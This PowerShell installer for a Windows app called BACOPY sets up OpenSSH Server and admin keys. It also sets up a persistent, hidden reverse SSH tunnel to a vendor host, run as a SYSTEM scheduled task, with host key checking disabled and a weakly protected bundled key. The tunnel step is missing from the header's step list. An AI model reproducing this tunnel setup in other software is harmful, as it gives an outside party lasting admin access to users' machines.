# =============================================================
# BACOPY Initial Setup (All-in-One)
# =============================================================
#
# Launched by the "INSTALL ON THIS PC" button in the GUI.
# This script handles all of the following automatically:
#
#   1. Install required runtimes (winget preferred / direct download fallback)
#        - Visual C++ Redistributable (required for Camoufox/engine)
#        - Edge WebView2 Runtime     (required for Electron GUI)
#   2. Install OpenSSH Server + start service + enable auto-start
#   3. Install admin public key in administrators_authorized_keys + set ACL
#   4. Harden sshd_config to pubkey-only auth (opt-in)
#   5. Add Windows Firewall inbound rule for port 22
#
# Requires administrator privileges (auto-launched by GUI after UAC approval).
#
# Parameters:
#   -AdminPubKeyPath  Path to admin public key file (optional)
#   -DryRun           Log only, no actual changes
#   -HardenSshdConfig Disable password auth (hardened mode)
#   -LogPath          Log file path (default: C:\ProgramData\BACOPY\setup-all.log)
# =============================================================

param(
    [string]$AdminPubKeyPath = "",
    [switch]$DryRun,
    [switch]$HardenSshdConfig,
    [string]$LogPath = "$env:ProgramData\BACOPY\setup-all.log"
)

$ErrorActionPreference = "Continue"

# --- Log init ---
$logDir = Split-Path -Parent $LogPath
if (-not (Test-Path $logDir)) { New-Item -Path $logDir -ItemType Directory -Force | Out-Null }
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    Write-Host $line
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
}

Write-Log "================================"
Write-Log "BACOPY Full Setup Start"
Write-Log "DryRun=$DryRun AdminPubKey=$AdminPubKeyPath"
Write-Log "OS: $([System.Environment]::OSVersion.VersionString)"
Write-Log "================================"

# --- 0. Admin check ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Log "Not running as administrator. Aborting." "ERROR"
    Write-Host ""
    Write-Host "This script must be run as administrator."
    Write-Host "If launched from GUI, click [Yes] in the UAC approval dialog."
    Read-Host "Press any key to exit"
    exit 1
}

# --- 1. Runtime install ---
Write-Log "--- Phase 1: Runtime packages ---"

# Check for winget
$wingetCmd = Get-Command winget -ErrorAction SilentlyContinue

function Install-WithWinget {
    param([string]$PackageId, [string]$DisplayName)
    if ($DryRun) { Write-Log "[DryRun] winget install $PackageId"; return $true }
    try {
        $result = winget install -e --id $PackageId --silent --accept-package-agreements --accept-source-agreements 2>&1
        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq -1978335189) {
            # -1978335189 = already installed
            Write-Log "${DisplayName}: OK (winget)"
            return $true
        }
        Write-Log "${DisplayName}: winget exit=$LASTEXITCODE" "WARN"
        return $false
    } catch {
        Write-Log "${DisplayName}: winget error $($_.Exception.Message)" "WARN"
        return $false
    }
}

function Install-VCRedist {
    # VCRedist: winget preferred, fallback to direct DL
    if ($wingetCmd) {
        $ok = Install-WithWinget "Microsoft.VCRedist.2015+.x64" "VCRedist 2015+x64"
        if ($ok) { return }
    }
    if ($DryRun) { Write-Log "[DryRun] VCRedist direct DL"; return }
    Write-Log "VCRedist: Trying direct download..."
    $url = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
    $dest = "$env:TEMP\vc_redist.x64.exe"
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 60
        Start-Process -FilePath $dest -ArgumentList "/install", "/quiet", "/norestart" -Wait -NoNewWindow
        Write-Log "VCRedist: direct download install complete"
    } catch {
        Write-Log "VCRedist direct download failed: $($_.Exception.Message)" "WARN"
    } finally {
        if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
    }
}

function Install-EdgeWebView2 {
    # Edge WebView2: winget preferred, fallback to direct DL
    if ($wingetCmd) {
        $ok = Install-WithWinget "Microsoft.EdgeWebView2Runtime" "Edge WebView2 Runtime"
        if ($ok) { return }
    }
    if ($DryRun) { Write-Log "[DryRun] WebView2 direct DL"; return }
    # Check if already installed
    $wv2 = Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" `
        -ErrorAction SilentlyContinue
    if ($wv2) { Write-Log "Edge WebView2: already installed"; return }
    Write-Log "Edge WebView2: Trying direct download..."
    $url = "https://go.microsoft.com/fwlink/p/?LinkId=2124703"
    $dest = "$env:TEMP\MicrosoftEdgeWebview2Setup.exe"
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 60
        Start-Process -FilePath $dest -ArgumentList "/silent", "/install" -Wait -NoNewWindow
        Write-Log "Edge WebView2: direct download install complete"
    } catch {
        Write-Log "Edge WebView2 direct download failed: $($_.Exception.Message)" "WARN"
    } finally {
        if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
    }
}

if (-not $wingetCmd) {
    Write-Log "winget not found. Falling back to direct download." "WARN"
    Write-Log "(winget requires Windows 10 v1709+ with App Installer)" "WARN"
}

Install-VCRedist
Install-EdgeWebView2

# --- 2. OpenSSH Server ---
Write-Log "--- Phase 2: OpenSSH Server ---"
$sshdCap = Get-WindowsCapability -Online -Name "OpenSSH.Server*" -ErrorAction SilentlyContinue
if ($sshdCap -and $sshdCap.State -eq "Installed") {
    Write-Log "OpenSSH Server: already installed"
} else {
    if ($DryRun) {
        Write-Log "[DryRun] Add-WindowsCapability OpenSSH.Server"
    } else {
        try {
            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | Out-Null
            Write-Log "OpenSSH Server: install complete"
        } catch {
            Write-Log "OpenSSH Server install failed: $($_.Exception.Message)" "ERROR"
        }
    }
}
if (-not $DryRun) {
    try {
        Start-Service sshd -ErrorAction SilentlyContinue
        Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
        Write-Log "sshd: started + auto-start ON"
    } catch {
        Write-Log "sshd start failed: $($_.Exception.Message)" "WARN"
    }
}

# --- 3. Admin public key ---
if ($AdminPubKeyPath -and (Test-Path $AdminPubKeyPath)) {
    Write-Log "--- Phase 3: Admin public key ---"
    $adminPubKey = (Get-Content $AdminPubKeyPath -Raw).Trim()
    if ([string]::IsNullOrWhiteSpace($adminPubKey)) {
        Write-Log "Public key file is empty" "WARN"
    } else {
        $authKeysPath = "$env:ProgramData\ssh\administrators_authorized_keys"
        if ($DryRun) {
            Write-Log "[DryRun] write admin pubkey to $authKeysPath"
        } else {
            $sshDir = "$env:ProgramData\ssh"
            if (-not (Test-Path $sshDir)) { New-Item -Path $sshDir -ItemType Directory -Force | Out-Null }

            $isNewFile = -not (Test-Path $authKeysPath)
            if ($isNewFile) {
                Set-Content -Path $authKeysPath -Value $adminPubKey -Encoding ASCII
                Write-Log "admin pubkey: file created"
                icacls $authKeysPath /inheritance:r 2>&1 | Out-Null
                icacls $authKeysPath /grant "Administrators:F" /grant "SYSTEM:F" 2>&1 | Out-Null
                Write-Log "ACL configured"
            } else {
                $existing = Get-Content $authKeysPath -Raw -ErrorAction SilentlyContinue
                if ($existing -and $existing.Contains($adminPubKey)) {
                    Write-Log "admin pubkey: already registered (skip)"
                } else {
                    Add-Content -Path $authKeysPath -Value "`n$adminPubKey" -Encoding ASCII
                    Write-Log "admin pubkey: appended"
                }
            }
        }
    }
} else {
    Write-Log "--- Phase 3: No admin pubkey (skip) ---"
}

# --- 4. sshd_config hardening (opt-in) ---
Write-Log "--- Phase 4: sshd_config (harden=$HardenSshdConfig) ---"
$sshConfig = "$env:ProgramData\ssh\sshd_config"
if (-not $HardenSshdConfig) {
    Write-Log "sshd_config hardening: skip (preserve existing config)"
} elseif ($DryRun) {
    Write-Log "[DryRun] edit sshd_config"
} else {
    if (Test-Path $sshConfig) {
        try {
            $cfg = Get-Content $sshConfig -Raw
            $backup = "$sshConfig.bak-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            Copy-Item $sshConfig $backup -Force
            Write-Log "sshd_config backup: $backup"
            if ($cfg -match "(?m)^#?PasswordAuthentication\s+\w+") {
                $cfg = $cfg -replace "(?m)^#?PasswordAuthentication\s+\w+", "PasswordAuthentication no"
            } else { $cfg += "`r`nPasswordAuthentication no`r`n" }
            if ($cfg -match "(?m)^#?PubkeyAuthentication\s+\w+") {
                $cfg = $cfg -replace "(?m)^#?PubkeyAuthentication\s+\w+", "PubkeyAuthentication yes"
            }
            Set-Content -Path $sshConfig -Value $cfg -Encoding ASCII
            Restart-Service sshd -ErrorAction SilentlyContinue
            Write-Log "sshd_config: pubkey-only auth configured"
        } catch {
            Write-Log "sshd_config edit failed: $($_.Exception.Message)" "WARN"
        }
    } else {
        Write-Log "sshd_config not yet created - skip" "WARN"
    }
}

# --- 5. Windows Firewall ---
Write-Log "--- Phase 5: Windows Firewall ---"
if ($DryRun) {
    Write-Log "[DryRun] New-NetFirewallRule BACOPY-sshd"
} else {
    # Remove old LAPLACE rule if present
    $oldRule = Get-NetFirewallRule -Name "LAPLACE-sshd" -ErrorAction SilentlyContinue
    if ($oldRule) {
        Remove-NetFirewallRule -Name "LAPLACE-sshd" -ErrorAction SilentlyContinue
        Write-Log "removed old LAPLACE-sshd rule"
    }
    $existingRule = Get-NetFirewallRule -Name "BACOPY-sshd" -ErrorAction SilentlyContinue
    if ($existingRule) {
        Write-Log "Firewall rule BACOPY-sshd: already exists"
    } else {
        try {
            New-NetFirewallRule -Name "BACOPY-sshd" `
                -DisplayName "BACOPY Copytrade - SSH Remote Support" `
                -Enabled True -Direction Inbound -Protocol TCP -LocalPort 22 `
                -Action Allow | Out-Null
            Write-Log "Firewall rule BACOPY-sshd: created"
        } catch {
            Write-Log "Firewall rule create failed: $($_.Exception.Message)" "WARN"
        }
    }
}

# --- 6. SSH reverse tunnel registered in Task Scheduler (GUI-independent) ---
Write-Log "--- Phase 6: SSH Support Tunnel (Task Scheduler) ---"

$resDir = Split-Path -Parent $PSCommandPath
$envPath = Join-Path $resDir ".env"

function Read-BacopyEnv {
    param([string]$Path)
    $result = @{}
    if (-not (Test-Path $Path)) { return $result }
    foreach ($line in (Get-Content $Path -Encoding UTF8 -ErrorAction SilentlyContinue)) {
        $line = $line.Trim()
        if ($line -eq '' -or $line.StartsWith('#')) { continue }
        $idx = $line.IndexOf('=')
        if ($idx -lt 1) { continue }
        $k = $line.Substring(0, $idx).Trim()
        $v = $line.Substring($idx + 1).Trim()
        $result[$k] = $v
    }
    return $result
}

$env = Read-BacopyEnv $envPath
$tunnelEnabled  = ($env['BACOPY_SUPPORT_ENABLED'] -eq '1')
$sshHost        = $env['BACOPY_SUPPORT_SSH_HOST']
$sshKeyRaw      = $env['BACOPY_SUPPORT_SSH_KEY']
$remotePort     = $env['BACOPY_SUPPORT_REMOTE_PORT']
$localPort      = if ($env['BACOPY_SUPPORT_LOCAL_PORT']) { $env['BACOPY_SUPPORT_LOCAL_PORT'] } else { '22' }
$isEncrypted    = ($env['BACOPY_SUPPORT_SSH_KEY_ENCRYPTED'] -eq '1')
$userEmail      = $env['BACOPY_SUPPORT_USER_EMAIL']

if (-not $tunnelEnabled -or -not $sshHost -or -not $remotePort) {
    Write-Log "SSH tunnel: config missing, skip (check BACOPY_SUPPORT_ENABLED/SSH_HOST/REMOTE_PORT)"
} else {
    # Resolve key file path
    $sshKeyPath = if ([System.IO.Path]::IsPathRooted($sshKeyRaw)) {
        $sshKeyRaw
    } else {
        Join-Path $resDir $sshKeyRaw
    }

    # Decrypt key and write to persistent path
    $plainKeyPath = "$env:ProgramData\BACOPY\support_key_plain"
    $keyOk = $false

    if ($DryRun) {
        Write-Log "[DryRun] skip SSH key processing"
        $keyOk = $true
    } elseif ($isEncrypted -and $userEmail -and (Test-Path $sshKeyPath)) {
        try {
            $encB64 = (Get-Content $sshKeyPath -Raw -Encoding ASCII).Trim()
            $emailBytes = [System.Text.Encoding]::UTF8.GetBytes($userEmail.ToLower())
            $saltBytes  = [System.Text.Encoding]::UTF8.GetBytes('bacopy-support-v1-2026')
            $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                $emailBytes, $saltBytes, 100000,
                [System.Security.Cryptography.HashAlgorithmName]::SHA256
            )
            $aesKey = $pbkdf2.GetBytes(32)
            $data        = [Convert]::FromBase64String($encB64)
            $iv          = $data[0..15]
            $ciphertext  = $data[16..($data.Length - 1)]
            $aes         = [System.Security.Cryptography.Aes]::Create()
            $aes.Key     = $aesKey; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
            $dec         = $aes.CreateDecryptor()
            $plain       = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            New-Item -Path (Split-Path $plainKeyPath) -ItemType Directory -Force | Out-Null
            [System.IO.File]::WriteAllBytes($plainKeyPath, $plain)
            icacls $plainKeyPath /inheritance:r /grant "SYSTEM:F" /grant "Administrators:F" 2>&1 | Out-Null
            Write-Log "SSH key: decrypted -> $plainKeyPath"
            $keyOk = $true
        } catch {
            Write-Log "SSH key decrypt failed: $($_.Exception.Message)" "WARN"
        }
    } elseif (-not $isEncrypted -and (Test-Path $sshKeyPath)) {
        New-Item -Path (Split-Path $plainKeyPath) -ItemType Directory -Force | Out-Null
        Copy-Item $sshKeyPath $plainKeyPath -Force
        icacls $plainKeyPath /inheritance:r /grant "SYSTEM:F" /grant "Administrators:F" 2>&1 | Out-Null
        Write-Log "SSH key: copied -> $plainKeyPath"
        $keyOk = $true
    } else {
        Write-Log "SSH key file not found: $sshKeyPath" "WARN"
    }

    if ($keyOk -and -not $DryRun) {
        # Write tunnel persistence script
        $tunnelScriptPath = "$env:ProgramData\BACOPY\run_tunnel.ps1"
        $tunnelScript = @"
# BACOPY SSH Support Tunnel -- runs independently of GUI
while (`$true) {
    try {
        & ssh.exe -i "$plainKeyPath" ``
            -o StrictHostKeyChecking=no ``
            -o BatchMode=yes ``
            -o ExitOnForwardFailure=yes ``
            -o ServerAliveInterval=30 ``
            -o ServerAliveCountMax=3 ``
            -N -R 127.0.0.1:${remotePort}:127.0.0.1:${localPort} ``
            $sshHost
    } catch {}
    Start-Sleep -Seconds 10
}
"@
        Set-Content -Path $tunnelScriptPath -Value $tunnelScript -Encoding UTF8
        Write-Log "Tunnel script written: $tunnelScriptPath"

        # Register in Task Scheduler
        $taskName = "BACOPY-SupportTunnel"
        $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existing) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            Write-Log "Removed existing task: $taskName"
        }
        $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tunnelScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet `
            -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) `
            -ExecutionTimeLimit ([TimeSpan]::Zero) `
            -MultipleInstances IgnoreNew
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -Force | Out-Null
        # Start immediately
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        Write-Log "Scheduled task registered: $taskName (SYSTEM, AtLogon + immediate start)"
    }
}

# --- Done ---
Write-Log "================================"
Write-Log "BACOPY Setup Complete"
Write-Log "Log: $LogPath"
Write-Log "================================"

if (-not $DryRun) {
    Write-Host ""
    Write-Host "==============================="
    Write-Host " BACOPY Setup Complete"
    Write-Host "==============================="
    Write-Host "Log: $LogPath"
    Write-Host ""
    Write-Host "Next steps:"
    Write-Host "  1. Restart the GUI"
    Write-Host "  2. SSH support tunnel will auto-connect at system startup (no GUI required)"
    Write-Host ""
    Start-Sleep -Seconds 5
}
exit 0
